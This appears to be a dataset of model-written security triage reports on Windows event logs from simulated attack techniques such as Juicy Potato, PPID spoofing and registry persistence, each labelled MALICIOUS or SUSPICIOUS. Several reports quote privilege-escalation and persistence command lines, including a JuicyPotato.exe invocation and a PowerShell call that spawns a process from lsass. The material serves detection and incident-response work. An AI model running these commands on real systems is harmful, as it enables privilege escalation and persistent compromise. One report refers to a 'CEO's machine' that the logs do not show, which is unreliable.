  - The high number of logs related to `MicrosoftEdgeUpdate.exe` processes running various commands (`/svc`, `/regsvc`, `/update`) is typical due to Microsoft's frequent updates to the Edge browser. These are not unusual on their own.

#### Final Assessment:

### ***Resolution: MALICIOUS***

There are multiple signs in the logs that collectively suggest malicious activity:
- The critical indicator lies within the use of `cmd.exe` to perform registry modifications under the guise of potentially malicious naming conventions using `""Malware""` and the inclusion of a known intercepting DLL (`amsi.dll`), which is often targeted to disable Windows Defender via AMSI bypass tactics.
- Routine benign background processes such as MicrosoftEdgeUpdate activity, although high, are expected and are not themselves malicious.
  
### Recommended Actions:
1. **Immediate Review of System State:**
   - Conduct a deep scan of the affected system, focusing on the inspected registry keys and associated paths (`amsi.dll`).
   - Isolate the machine from the network to prevent wider potential spread or data exfiltration while under investigation.

2. **Incident Response Protocols:**
   - Start an incident response to uncover how the suspicious activity originated, whether through a malicious payload, user compromise, or other vectors.

3. **Monitor and Mitigate Further Risks:**
   - Monitor for continued abnormal activities like unusual process launches or registry changes.
   - Reinforce user education on recognizing attempted phishing and other deceptive activities that may compromise systems inadvertently."
HKLM - Policy Settings Explorer Run Key,"Based on the analysis of the provided Windows event logs, notable events and behaviors are as follows:

1. **Sysmon Logs:**
   - Multiple executions of `wevtutil.exe` and `conhost.exe` by the user `SERVER002\admin_test`. While `wevtutil.exe` is a legitimate Windows utility for managing event logs, frequent or unscheduled usage might be a cause for suspicion, indicating log tampering or reconnaissance.
   - Execution of PowerShell script: The PowerShell command attempts to modify the registry under the path `HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run` to add a new entry which makes `calc.exe` run at startup. This behavior is typically associated with persistence mechanisms used by malware.

2. **PowerShell Logs:**
   - Evidence of PowerShell execution that corresponds to the Sysmon log entries. The CommandLine data shows the intent to create a registry entry, setting a suspicious startup task (`calc.exe`). Although `calc.exe` is a legitimate Windows application, using it in this manner is unconventional and may be indicative of a proof-of-concept or preliminary attack.

3. **System Logs:**
   - Time manipulation events are recorded, which may indicate an attempt to obscure activity timestamps and could signify malicious activity. The usage of system capabilities to change time settings can be a red flag.

4. **Security Logs:**
   - Logon sessions for the user `admin_test` with elevated privileges (SeDebugPrivilege, SeTakeOwnershipPrivilege, etc.). While these privileges might be expected for an administrative user, they deserve scrutiny given the context of suspicious log entries.

5. **Application Logs:**
   - Includes the typical log entries with no significant anomalies noted, aside from timed correlations with other logs.

**Assessment:**
- The PowerShell activity that involves modifying registry entries to execute an application on startup is malicious behavior, often used for persistence by attackers.
- The frequent use of `wevtutil.exe` in combination with time manipulation activities suggests potential log clearing or altering attempts.

**Resolution: MALICIOUS**

**Guidance on How to Proceed:**
- Immediately isolate the system (`Server002`) to prevent further propagation of any malicious activity.
- Perform a comprehensive forensic analysis to understand the full scope of the attack and the timeline.
- Investigate any external connections and activities linked to the involved processes and user accounts.
- If applicable, reset credentials and permissions associated with the `admin_test` account and review administrative privileges across the network.
- Ensure regular review and monitoring of similar logs to detect and mitigate potential future attacks.
- Educate users and administrators about recognizing signs of compromise and reporting unusual activities."
Snake Malware Kernel Driver Comadmin,"### Analysis of the Logs:

#### PowerShell Logs:
- A repeated execution of a potentially suspicious PowerShell script is attempted. The script checks for a directory at `C:\Windows\system32\Com` and, if absent, creates it. It then writes a file `comadmin.dat` with random bytes to this directory.
- The execution of this PowerShell script could be seen as an attempt to hide malicious payloads or establish persistence by creating a directory and file in the system32 directory, a critical system path, which is typically characteristic of malicious activities.

#### Application and System Logs:
- The logs are relatively benign, showing routine operations such as stopping services or no significant events recorded.
- These logs do not show any error messages or unusual service behavior.

#### Sysmon Logs:
- The logs reveal multiple executions of Windows utilities such as `wevtutil.exe`, `conhost.exe`, `whoami.exe`, and `powershell.exe`. 
- The user `SERVER002\admin_test` is associated with these executions, and the integrity level is marked as 'High', indicating potential administrative privileges.
- The sequence displays several PowerShell executions, matching the script seen in the PowerShell logs, with context from `wsmprovhost.exe`.
- There is also significant activity involving `MicrosoftEdgeUpdate.exe`, which may be part of legitimate software update processes, as Microsoft Edge involves automatic updates.

### Assessment:
- **Suspicious PowerShell Activities:** The activity involving PowerShell suggests behavior that is not typical for routine administrative tasks and warrants suspicion, given the potential changes to critical system directories.
- **Sysmon Activity Confirming PowerShell Execution:** The presence of multiple administrative-level executions and the initiation of processes associated with recently created script files confirm that an unusual sequence of events took place.

### Conclusion:
- **Resolution: SUSPICIOUS**. The behavior observed in the logs, especially around PowerShell script execution that alters critical parts of the system, suggests activity that is not definitively malicious but is highly suspect. This activity could be part of reconnaissance or initial steps of a more severe attack.
  
### Recommendations:
1. **Immediate Isolation:** Consider isolating the affected machine (Server002) from the network to prevent any potential lateral movement or escalation.
2. **In-Depth Investigation:** A thorough investigation is required to determine the intent and origin of these PowerShell scripts. Analyze scripts thoroughly and search for related IOCs across the network.
3. **Administrative Access Review:** Review and potentially update credentials or privileges associated with the user `SERVER002\admin_test` and ensure appropriate usage is enforced.
4. **Monitor Network Traffic:** Closely monitor network traffic from the machine to detect any unusual outbound connections.
5. **Endpoint Detection:** Deploy and check EDR solutions on Server002 to identify any other anomalous activities occurring on the endpoint.
6. **User Awareness & Training:** Ensure that users are aware of the threats posed by such activities and train them to recognize and report suspicious activities. 

Further forensics and threat hunting in your environment regarding similar patterns are recommended to ensure no widespread issues."
Parent PID Spoofing - Spawn from Current Process,"### Analysis of Logs:

#### **Windows PowerShell Logs:**
- The logs show a consistent execution pattern of PowerShell commands with the command line: `{Start-ATHProcessUnderSpecificParent -FilePath $Env:windir\System32\WindowsPowerShell\v1.0\powershell.exe -CommandLine '-Command Start-Sleep 10' -ParentId $PID}`.
- The use of `Start-ATHProcessUnderSpecificParent` is not a typical PowerShell command and doesn't relate to standard PowerShell functionality, suggesting it might be an obfuscation or scripting technique potentially used by an attacker.
- Multiple PowerShell sessions were started very briefly (start and stop events occur close in time), which could be concerning if it was used as part of a script or malicious tool.

#### **Sysmon Logs:**
- Logs show numerous processes for `conhost.exe` and `wevtutil.exe` running under an admin context (SERVER002\admin_test), which could indicate automated script execution or process hosting.
- A suspicious PowerShell process shows an unusual command line, possibly indicating an attempt to hide or perform background actions without visibility.

#### **System Logs:**
- Logs primarily show Windows Update activities and various updates to Microsoft Store apps, which appear benign.
  
#### **Security Logs:**
- No clear evidence of privilege escalation attempts or unauthorized access patterns.
  
#### **Application Logs:**
- The logs don't provide suspicious entries other than usual operations.

### Assessment:

Based on the information, while normal system and update activities are observed in the System logs, the behavior observed in the PowerShell logs is suspicious. The execution of a potentially customized or non-standard PowerShell commands suggests that there may be an effort to execute actions either unauthorizedly or quietly under the system's radar. The consistency and frequency of these PowerShell executions without clear evidence of legitimate administrative tasks raise an alert.

### Resolution: SUSPICIOUS

**Risks Identified:**
- Potential execution of obfuscated or non-standard PowerShell scripts.
- The use of administrative credentials to run potentially unauthorized processes.

**Guidance on How to Proceed:**
1. **Isolate the Machine:** Until a full analysis can be completed, isolating the affected system (Server002) can prevent any further potential actions from being carried out by malicious scripts or attackers.
2. **Conduct Forensic Investigation:** Carry out a deeper forensic investigation into the activities occurring on Server002. Look for:
   - File modifications, particularly new or unknown scripts in locations like Temp directories.
   - Network connections from the machine that could indicate data exfiltration.
3. **Review PowerShell Command Usage:** Capture and decode or analyze the PowerShell scripts or commands in use to determine their exact function and origin.
4. **Update Security Measures:** Ensure all systems have up-to-date security patches and a thorough security policy is enforced, checking for unauthorized modifications on critical systems.
5. **Audit Logs Regularly:** Further review of logs for any new suspicious patterns or anomalies and analyzation of logs in real-time for future prevention.

Given the suspicious nature of the PowerShell usage, elevating this issue for further review by the incident response team is prudent to ensure any malicious activity is promptly identified and mitigated."
Access Token Manipulation,"## Analysis and Findings:

Upon reviewing the provided event logs, a few activities and behaviors stand out that warrant careful inspection:

### Suspicious and Anomalous Behaviors:

1. **Unusual PowerShell Execution:**
   - Multiple logs indicate the use of a PowerShell script with the command: 
     ```
     powershell.exe & {Set-ExecutionPolicy -Scope Process Bypass -Force, $owners = @{}, gwmi win32_process |% {$owners[$_.handle] = $_.getowner().user}, Get-Process | Select ProcessName,Id,@{l=\""Owner\"";e={$owners[$_.id.tostring()]}}, \""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.002\\src\\GetToken.ps1\""; [MyProcess]::CreateProcessFromParent((Get-Process lsass).Id,\""cmd.exe\"")}
     ```
   - This script makes use of ""Set-ExecutionPolicy -Scope Process Bypass -Force"" which is typically used to avoid execution policy restrictions and indicates potential misuse.
   - It mentions loading a script `GetToken.ps1` from a temp directory, which is a red flag, as it's common for malicious scripts to be run from temp folders.
   - The script also indicates interaction with the `lsass` process, which can be an indicator of credential dumping attempts.

2. **File Operations using Additional Processes:**
   - The presence of numerous process creations involving standard tools like `hostname.exe`, `whoami.exe`, and various `conhost.exe` instances are typical; however, they may be used to obfuscate activities or mislead investigations in conjunction with suspicious activity.
   
3. **Use of `wevtutil.exe`:**
   - There are repeat executions of `wevtutil.exe` by the `admin_test` user:
     ```
     C:\Windows\System32\wevtutil.exe
     ```
   - `wevtutil.exe` is a tool for managing event logs and can be used by attackers to clear logs, cover tracks, or steal log data, especially if it appears unexpectedly.

### Indicators of Potential Malicious Activity or Compromise:

- **Privilege Escalation Attempts:** The PowerShell script's attempt to interact with `lsass` for potential token or credential manipulation hints at privilege escalation attempts.
- **Obfuscation Techniques:** Execution of typical admin tools could be used to blend malicious actions within a series of legitimate system administrative actions.
- **Stealth and Evasion:** The script executed appears designed for evasion and unauthorized access, suggesting an intrusion or insider threat.

## Conclusion:

Based on the analysis of these logs, the following threat assessment is made:
- The behavior exhibited in the logs indicates clear attempts at evasion and potential unauthorized access, led by the suspicious PowerShell activity targeting `lsass`.
- Given the execution policy bypass, use of temporary directories, and tool use consistent with malicious activities, the logs point towards a potential compromise effort.

Therefore, the activity in the logs is categorized as **MALICIOUS**.

## Guidance on How to Proceed:

1. **Isolation and Containment:** Immediately isolate the affected host (Server002) from the network to prevent further compromise and lateral movement.
2. **Forensic Analysis:** Conduct a detailed forensic analysis on the host to identify the extent of the compromise and any potentially exfiltrated data.
3. **Credential Revocation:** Revoke and reset credentials, especially those linked to `admin_test` or those involved with high-privilege actions.
4. **Comprehensive Threat Hunt:** Initiate a full investigation and hunt for similar activities across the environment to identify other affected systems or ongoing threats.
5. **Security Review and Hardening:** Review and harden the PowerShell execution policies, implement stricter monitoring, and apply timely patches to reduce vulnerability surfaces.

Develop a plan for communication and remediation with stakeholders and perform after-action reviews to strengthen future defense measures."
HKLM - Modify default System Shell - Winlogon Shell KEY Value,"### Analysis of Logs

#### Windows PowerShell Logs
- **Chain of Command Execution**: All PowerShell events contain the same command-line argument that modifies registry keys related to `Winlogon` Shell:
  - `Get-ItemPropertyValue` to retrieve the current value of `HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell`.
  - `Set-ItemProperty` to create a backup of the current `Shell` registry value.
  - Append `C:\Windows\explorer.exe` to the existing `Shell` value and set it.

- **Suspicion Generation**:
  - **Modification of `Winlogon\Shell`**: This particular registry key is critical because it defines what executables are launched when Windows logs on. The alteration of `Shell` values can be a sign of persistence mechanisms used by malware.
  - **Execution Context**: This action is performed via PowerShell, which is a common tool for both administrators and attackers, providing a stealthy method to make changes.

#### Sysmon Logs
- **Process Executions**:
  - Multiple instances of `wevtutil.exe`, `conhost.exe`, and `whoami.exe` executed by the user `SERVER002\admin_test`, raising questions about privileged usage and intention.
  - `powershell.exe` runs the registry modification command under a high integrity level, indicating administrative privileges.
  - `MicrosoftEdgeUpdate.exe` series of events show software updates, likely for Microsoft Edge - benign in isolation but could mask malicious activities if not expected.

#### Security Logs
- **Logon and Privilege Escalation**:
  - `admin_test` account is involved with several events suggesting elevated privileges (`SeDebugPrivilege`, `SeSystemEnvironmentPrivilege`).
  - Events indicate this account has logged on using NTLM authentication, typical of remote logons.
  
- **Time Discrepancy**:
  - Unusual time setting events suggesting potential tampering or issues with time synchronization; can be indicative of attempts to hide activities.

#### Application and System Logs
- **Edge Update Events**: Normal update operations, non-suspicious by themselves.
- **Time Adjustments**: Kernel logs indicate the system's time has been adjusted, which is atypical and aligns with earlier noted security time events.

### Assessment
- **Risk Elements**: The modification to the `Winlogon\Shell` registry key is concerning due to its implications for system persistence.
- **Privileged Activity**: The `admin_test` account's actions align with administrative functions, but the nature and timing of registry modifications suggest potential exploitation.

### Resolution
- **Resolution**: **MALICIOUS**
  - The logs indicate unauthorized and potentially harmful modification of critical system settings, particularly surrounding use of PowerShell to alter `Winlogon\Shell` registry key. The combination of this registry modification and its execution context strongly indicate malicious intent or comprise.

### Guidance on Proceeding
- **Immediate Steps**:
  - Investigate the `admin_test` account's usage, legitimacy, and access controls.
  - Conduct a comprehensive scan for malware using updated AV tools.
  - Review system integrity, especially registry settings and startup programs.
  - Check any anomalies in logging, time synchronization, or discrepancies.
- **Long-term Actions**:
  - Implement heightened security monitoring on key executive systems.
  - Review and restrict elevated privileges and access rights across sensitive accounts.
  - Train personnel on identifying phishing and other attack vectors commonly seen leading to privileged session abuse."
Parent PID Spoofing using PowerShell,"Upon examining the provided logs, several indicators point to suspicious and potentially malicious activity on the machine. Here's a detailed analysis:

1. **Logon Events**:
   - Multiple logon events with EventID ""4624"" show logons using the ""SYSTEM"" user and ""SERVER002$"" account, which are typical for services, suggesting background activity by system services.

2. **Privilege Use**:
   - EventID ""4672"" indicates ""Special privileges assigned to new logon"" with a list of high-level privileges that include `SeDebugPrivilege`, which can be exploited for malicious purposes (e.g., privilege escalation by attackers).

3. **Credential Dumping Indicator**:
   - EventID ""5379"" contains multiple entries for failed credential access attempts on resource strings like ""MicrosoftAccount:"" and ""WindowsLive:"", which may indicate attempts to access account credentials, a precursor to credential dumping.

4. **Process Execution and PowerShell Activity**:
   - The Sysmon logs show suspicious PowerShell activity with EventID ""1"":
     - The execution of ""powershell.exe"" with a specific command line involving ""PPID-Spoof.ps1"" script under user ""SERVER002\\admin_test"" is highly suspicious.
     - This script includes parameters for PPID (Parent Process ID) spoofing, which is a tactic used to hide malicious processes by attaching them to legitimate parent processes.
     - The `dllpath` parameter is set to load a DLL (`calc.dll`) through Internet Explorer (`iexplore.exe`), which could be part of a more complex execution chain or an exploit vector.

5. **System and Network Level Processes**:
   - The execution and subsequent stoppage of these PowerShell scripts could indicate attempts at persistence or lateral movement using compromised credentials or tools.

6. **Concerning Toolset**:
   - Process spawning using `wsmprovhost.exe` as a parent for PowerShell execution is noteworthy due to its rarity and potential use in privilege escalation scenarios.

Based on these observations:

- **Assessment**: The evidence strongly suggests suspicious and potentially malicious activity.
- **Threats and Risks Identified**: Execution of scripts for PPID spoofing and DLL injection, possible credential dumping attempts, and unnecessary privilege assignments.
- **Guidance**: Immediate steps should include isolating the machine, conducting a forensic disk and memory capture, reviewing other systems for similar log entries, and reaching out to all users who might have been targeted or accessed the system.

**Resolution**: MALICIOUS - The logs contain activity highly indicative of a compromise involving PowerShell exploitation and other forms of potential manipulation of system processes and credentials."
At.exe Scheduled task,"**Analysis of Logs:**

1. **Time Change Events (Security Log, System Log):**
   - Event ID 4616 and System events related to time change by ""svchost.exe"" indicate slight discrepancies in time adjustments. While time change can be a normal administrative task or the result of network time synchronization, frequent and small adjustments can sometimes be indicative of attempts to bypass security measures such as time-based restrictions or logging controls. However, the credentials used are ""LOCAL SERVICE"" which is standard for time synchronization tasks.

2. **Command Execution and Potential Exploits (Sysmon Log):**
   - The logs show instances of command line utility executions such as `hostname.exe`, `whoami.exe`, `cmd.exe`, and `wevtutil.exe` (Event IDs: 1, 5). These commands are legitimate, but their usage can be investigated further:
     - **`cmd.exe` with `/c at 13:20 /interactive cmd`**: The ""at"" command is used to schedule tasks, and specifically, the `/interactive` flag can execute tasks in the interactive window, potentially leading to privilege escalation if exploited. The use of scheduled tasks alongside `cmd.exe` suggests suspicious behavior and might be indicative of a persistence mechanism or unauthorized task scheduling.   
     - **`wevtutil.exe`**: This utility is used for querying or modifying event logs. While legitimate, if used deceptively, it could be employed to hide tracks or modify logs.
   
3. **High Integrity and Administrative Access (Sysmon Log):**
   - Many events show execution by the ""admin_test"" user with high integrity levels. This context suggests an elevated privilege context which can be red flags if not accountable within a security team's operational scope.
   - The usage of `whoami.exe` and `hostname.exe` are basic and command-line oriented, potentially indicating reconnaissance or validation scripts to discern user and system contexts for a user already within an elevated permission space.

4. **Processes Related to `MicrosoftEdgeUpdate.exe`, `sppsvc.exe`, `WmiPrvSE.exe`, `TrustedInstaller.exe`, and `TiWorker.exe`:**
   - These are processes related to updating services, software protection, system management, and windows servicing. These seem ordinary, and belong to expected system operations by the ""SYSTEM"" user.

**Assessment and Recommendations:**

Based on the logs:
- The presence of task scheduling (`cmd.exe /c at`) in the context observed, especially with the potential for interactive execution, is unusual and potentially indicative of malicious intent.
- Elevated usage of command-line utilities like `wevtutil.exe` without a precise task or administrative approval in logs suiting server operational context may be suspectful.

**Resolution: SUSPICIOUS**

**Threats/Risks Identified:**
- The scheduled task creation with the execution of `cmd.exe` using ""at"" with interactive privileges presents potential risk for unauthorized privilege escalation or persistence.
- `wevtutil.exe` usage alongside other command-line utilities should be monitored and correlated with administrative operations.

**Guidance on Proceeding:**
- Perform review or execution of suspicious task scheduling and verify such tasks with responsible administrators.
- Closely monitor for repetitive or further untoward command executions and maintain vigilance for any signs of privilege escalation or persistence mechanisms.
- Reconcile observed admin account activity with authorized activity logs or check for misuse of credentials. Consider user intervention with alerts if anomalies in user behavior are confirmed.
- Consider enhancing logging around task scheduler operations and reviewing network connectivity within the timeframe of these events for external interactions.

Further investigation is advised to ascertain the intent or pattern of behavior if unauthorized scheduling or command execution is confirmed."
Domain Password Policy Check: No Lowercase Character in Password,"Based on the provided Sysmon and Windows PowerShell logs, let's analyze and assess the activities:

1. **Microsoft Edge Installation**:
   - Multiple events show the Microsoft Edge installer being executed, which includes the setup.exe located within Edge's usual update directories. The command lines are consistent with the standard update or installation procedures for Microsoft Edge.
   - These processes are executed under the `NT AUTHORITY\SYSTEM`, which is expected for system-level installation tasks.

2. **Powershell Execution**:
   - A PowerShell script was executed using the command: 
     ```powershell
     & { $credFile = ""${env:LOCALAPPDATA}\file\${env:USERNAME}.txt""
     ... }
     ```
   - This script seems to target user password changes and checks for stored credentials. It contains logic for setting new passwords and handling errors, including error code 86, which is usually related to incorrect passwords.
   - Storing passwords in file format, even in a secure string, can be risky if not properly managed. Such scripts are suspicious as they could potentially be used by an attacker to maintain persistence or perform unauthorized actions, especially given the sensitive operation of password changes.
   
3. **Process Execution by Uncommon Users**:
   - Multiple legitimate Windows binaries, such as `wevtutil.exe` and `conhost.exe`, were executed by the user ""SERVER002\admin_test"". While the processes themselves are not suspicious, the context of their execution, especially in conjunction with the PowerShell activity, merits further attention.

Considering the behaviors observed:

- The execution of standard installers like Microsoft Edge is expected and does not suggest malicious activity.
- However, the PowerShell script dealing with user password management raises a red flag due to:
  - Its focus on credential handling and manipulation.
  - Potential use as part of a larger setup for maintaining unauthorized access.

**Assessment and Resolution**:
The logs reflect both routine system operations and potentially suspicious activities. Given the evidence related to the PowerShell script, which could be part of malicious activities aimed at credential theft or alteration, the situation is deemed:

**SUSPICIOUS**.

**Guidance**:
1. Ensure that password management scripts are legitimate, reviewed, and authorized by your IT security team. Investigate the origin and approval status of this script.
2. Review system access and modification to verify that no unauthorized changes have been made.
3. Implement monitoring alerts for unexpected handling of credential files and administrative commands executed on sensitive user accounts.
4. Conduct a thorough verification of the user and actions taken under ""SERVER002\admin_test"" to ensure activities align with typical usage and permissions."
Juicy Potato,"Upon reviewing the provided Sysmon, Application, and Windows PowerShell logs, several indicators suggest potentially malicious activity on the host machine. Here is a detailed analysis of the log entries:

1. **PowerShell Execution:**
   - Multiple Sysmon EventID 1 entries show evidence of PowerShell spawning with suspicious command-line arguments that include the use of a tool called ""JuicyPotato.exe"". This tool is commonly associated with privilege escalation attacks on Windows systems.
   - The command line contains parameters indicative of attempting to impersonate a higher-privilege user:
     ```
     ""powershell.exe"" & {cmd /c 'C:\Users\ADMIN_~1\AppData\Local\Temp\file\..\Externalfiles\JuicyPotato.exe' -l '7777' -t * -p '$env:windir\system32\notepad.exe' -c '{F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}'}
     ```
   - This is a strong indication of malicious intent, as Juicy Potato exploits known vulnerabilities to elevate privileges.

2. **Cmd.exe Execution:**
   - The logs indicate that cmd.exe was used with similar parameters that involve Juicy Potato, showing a pattern of execution of potential privilege escalation tooling.
   - Command-line parameters reflect an attempt to run `notepad.exe` under potentially escalated privileges, leveraging the COM object CLSID `{F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}`.

3. **Process Tree:**
   - Processes related to Microsoft Edge Update (`MicrosoftEdgeUpdate.exe`) are shown executing frequently. While this could be benign, the juxtaposition in logs next to PowerShell executions may indicate an attempt to disguise activity as legitimate software updates or leverage trusted software paths.

4. **High Integrity Level and SYSTEM User:**
   - Multiple process executions are occurring with a high integrity level and under the NT AUTHORITY\SYSTEM account. While common for system updates, the timing and correlation with PowerShell and cmd.exe entries heighten suspicion.

5. **Unusual Application Log Entries:**
   - The application log shows a brief stop in the edgeupdate service, which could correlate with manual or suspicious interventions in service operations.

Overall, the presence of Juicy Potato executions via PowerShell, under high integrity operations, and the attempt to escalate privileges suggests malicious activity aimed at compromising the host machine.

**Assessment: MALICIOUS**
- The use of Juicy Potato, an exploitation tool for privilege escalation, combined with the manner it was executed, confirms that these activities were potentially conducted by an unauthorized entity or software.

**Guidance on How to Proceed:**
- Conduct a thorough forensic analysis of the machine, focusing particularly on identifying other related malicious artifacts.
- Isolate the affected machine from the network to prevent further spread or data exfiltration.
- Examine any potentially compromised user accounts, especially those with administrative privileges, and enforce a password reset policy.
- Review and strengthen endpoint protection mechanisms to detect and prevent such privilege escalation attempts in the future.
- Report the incident to appropriate internal security teams and, if necessary, to external cybersecurity authorities for further investigative or legal action."
Change Startup Folder - HKLM Modify User Shell Folders Common Startup Value,"Upon the analysis of the provided log entries, several points of interest have emerged, indicating potentially suspicious activity:

### Key Findings:

1. **PowerShell Activity:**
   - A PowerShell command was executed, which included the following actions: 
     - Creation of a directory in the temporary environment path.
     - Copying of `calc.exe` from `C:\Windows\System32` to this directory.
     - Modifying the Windows Registry to change the `Common Startup` folder path to this new directory.
   - The command modifying the startup entries in the registry is concerning as it can be used to maintain persistence by executing the copied `calc.exe` each time the system starts, which is a known technique leveraged in various malware attacks.

2. **Process Activity:**
   - Frequent invocation of system utilities like `wevtutil.exe`, `conhost.exe`, `whoami.exe`, and `powershell.exe` by the user `SERVER002\admin_test`. The user appears to be conducting activities that may not typically align with regular business operations.
   - These processes could suggest scripted or automated activity, potentially part of a reconnaissance or initial reach into the system.

3. **EdgeUpdate Activity:**
   - A flurry of activity involving `MicrosoftEdgeUpdate.exe` and various related processes (including update setup utilities running from temporary directories) was captured in the logs.
   - While frequent updates from the Microsoft Edge Update service are not entirely unusual, the involvement of setup executables running from a temp directory might warrant further investigation, particularly if unexpected or lacking corroborating normal update protocol records.

### Assessment:

The combination of these log entries raises a notable concern. The PowerShell script modifies critical startup configurations, suggesting potential sophistication in attempting persistence and evasion techniques. The registry modification for startup, if unauthorized, is a significant red flag.

Given these findings, the activity observed is suggestive of potential compromise, aligning with tactics commonly associated with malware attempting to establish persistence on a system.

### Risk & Threat Identification:

- **Persistence Mechanism:** The alteration of startup entries indicates an attempt to have recurring execution privileges, which is typical in advanced persistent threats or similar intrusion sets.
- **Reconnaissance & Command Execution:** The running of administrative commands and processes in rapid succession might suggest exploration or exploitation efforts.

### Guidance and Next Steps:

1. **Immediate Actions:**
   - Isolate the system (`Server002`) to prevent further potential spread or escalation.
   - Review system/user access logs for additional context or corroborating activities potentially from external user logins.
   - Cross-reference the observed PowerShell script against known threat intelligence sources for additional insights into possible known malware families.

2. **Further Investigation:**
   - Verify the legitimacy of the Microsoft Edge update process with known updates' schedules and logs from a trusted Microsoft Update server.
   - Perform forensic imaging and analysis to capture an exact state for deeper analysis.
   - Conduct a security audit of `admin_test` user activities and determine if this aligns with expected behavior for the role.

3. **Remediation:**
   - If confirmed malicious, proceed with a thorough cleansing of modified registry entries or files planted by the suspect scripts.
   - Strengthen user awareness around suspicious activity detection, especially around endpoint behaviors including unexpected application launches or system modifications.

### Resolution:

**MALICIOUS**  
The described activities feature characteristics strongly indicative of malicious intent, requiring immediate security intervention and detailed examination."
Suspicious vbs file run from startup Folder,"Upon reviewing the provided Windows event logs, several points of interest suggest potentially suspicious and possibly malicious activity:

1. **PowerShell Activity**:
   - **Command Execution**: The PowerShell logs indicate the execution of a script that copies a `.vbs` file from a temporary location (`C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.001\src\vbsstartup.vbs`) to Startup directories (`$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs` and `C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\vbsstartup.vbs`). These locations ensure that the script runs on system startup, which is a common persistence mechanism.
   - **Execution with `cscript.exe`**: Following the file copy, `cscript.exe` is used to execute the `vbsstartup.vbs` script. The combination of these actions is often associated with attempts to run scripts covertly, potentially to maintain persistence or execute other commands.

2. **Sysmon Process Activity**:
   - **Frequent `wevtutil.exe` and `conhost.exe` Executions**: There is repeated execution of `wevtutil.exe` and `conhost.exe` initiated by the user `SERVER002\admin_test`. While these processes themselves are not inherently malicious, frequent and automated invocation could suggest script-driven actions or an attempt to interact with event logs suspiciously.
   - **Process Spawn from PowerShell**: The logs show `cscript.exe` processes starting from `PowerShell`. This chain of execution from PowerShell to `cscript` to a VBScript file in the startup directory is concerning and suggests automated, potentially malicious activity.

3. **Security and System Logs**:
   - **Time Change Events**: There are multiple time changes logged in the Security and System logs. While not unusual in server environments due to synchronization with a time server, frequent changes could sometimes be indicative of attempts to manipulate time settings to avoid detection based on time-of-event recording.

Based on this analysis, considering the combination of persistence mechanisms, script executions, and unusual process spawning patterns, the activity in the logs is concerning. It is suggestive of an automated script attempting persistence or other unauthorized activities.

### Assessment:
- **Resolution**: **MALICIOUS**
- **Threats/Risks Identified**: Possible persistence mechanism via script execution at startup, potential unauthorized activities using PowerShell within critical directories.
- **Guidance**: Immediate further investigation is warranted:
  - Quarantine and perform a comprehensive forensic analysis of the system (`Server002`).
  - Identify the source or origin of the script being executed.
  - Review user `admin_test` actions and privileges.
  - Verify the integrity of other systems in the network for similar activity.
  - Consider resetting any compromised credentials and enhancing monitoring to detect similar incidents."
PowerShell Modify A Scheduled Task,"After analyzing the provided Windows event logs, the following points regarding suspicious or potentially malicious activities are noted:

### Windows PowerShell Logs:
1. **Scheduled Task Creation with Elevated Privileges**:
   - The PowerShell logs indicate the use of PowerShell to create a new scheduled task (`fileTaskModified`) that executes `cmd.exe` at logon with admin privileges 
   - Following the initial task creation, the task's action is modified to execute `Notepad.exe`.

   **Assessment**: This behavior is highly suspicious. The modification of a task to execute a benign application like `Notepad.exe` after setting up a potentially more harmful initial action (`cmd.exe` with admin rights) could be an attempt to mask malicious intent after privilege escalation or establish persistence.

### Sysmon Logs:
2. **Execution of Unexpected Utility Tools**:
   - Several instances of `wevtutil.exe` executed by `SERVER002\admin_test` are logged. `wevtutil.exe` is a command-line utility to manage event logs. Its unusual usage may indicate log tampering or deletion attempts.
   - `whoami.exe` and `hostname.exe` executions following potential privilege escalation are logged which can suggest reconnaissance activities aiming to acquire information about current user privileges or network.

   **Assessment**: The usage of these utilities combined with their timing relative to the PowerShell execution could be indicative of reconnaissance or log evasion activities, which are suspicious.

### Security Logs:
3. **High-Privilege Logons**:
   - There are multiple logon events with elevated token usage (`%%1842`) and privileges, such as `SeDebugPrivilege` among others, which are indicative of sessions that may have excessive or unauthorized privilege levels.
  
   **Assessment**: Elevated privileges and specific settings used in these logons suggest possible privilege escalation or misuse of privileged accounts, raising suspicion.

### System Logs:
4. **Time Changes**:
   - The logs indicate changes in the system time. Log timestamps shifting backwards (`OldTime` > `NewTime`) are logged twice, potentially to obscure activities in logs or create confusion in event chronology.

   **Assessment**: Unauthorized manipulations of system time are a common technique used to cover tracks and obfuscate audit trails, thereby further indicating suspicious activity.

### Conclusion:
The combination of logs suggests behaviors associated with attempts to gain unauthorized access, escalate privileges, and potentially establish persistence mechanisms. These actions, especially within the context of the CEO's machine, are concerning.

### Resolution:
**SUSPICIOUS** - The logs contain activity that doesn't look right and needs more investigation.

### Guidance on Proceeding:
- **Immediate Investigation**: Conduct a thorough review of machine `Server002`, focusing on user `admin_test` activities.
- **Security Posture Assessment**: Review system integrity, check for further unauthorized changes or tasks.
- **Audit & Logging Review**: Look into event logs for signs of tampering or further suspicious activities.
- **Forensics**: Conduct a forensic analysis to determine the origin and intention of the suspicious PowerShell scripts and scheduled tasks.
- **Containment and Eradication**: If confirmed malicious, remove unauthorized scheduled tasks and perform system cleanup to remove any persistent threats.
- **Strengthen Security Controls**: Strengthen monitoring and alerts on PowerShell, scheduled tasks, and high-privilege activities to improve detection and response."
Suspicious jse file run from startup Folder,"Upon conducting a thorough review of the provided log entries, I have identified several points worth investigating:

### Analysis

1. **PowerShell Execution:**
   - There is a significant entry in the Windows PowerShell logs indicating that PowerShell was executed to copy the `jsestartup.jse` script to the Startup folder and then executed using `cscript.exe`. This operation is suspicious as it attempts to persist a JScript file to execute at startup, which is a common tactic used by malware for persistence on a system.

2. **Sysmon Logs:**
   - The Sysmon logs detail process creation events showing interactions between PowerShell and `cscript.exe` using a `.jse` script located in a temporary directory. Such scripting operations can often be indicative of macros or scripts intended for unwanted operations, such as malware operations or data exfiltration activities.
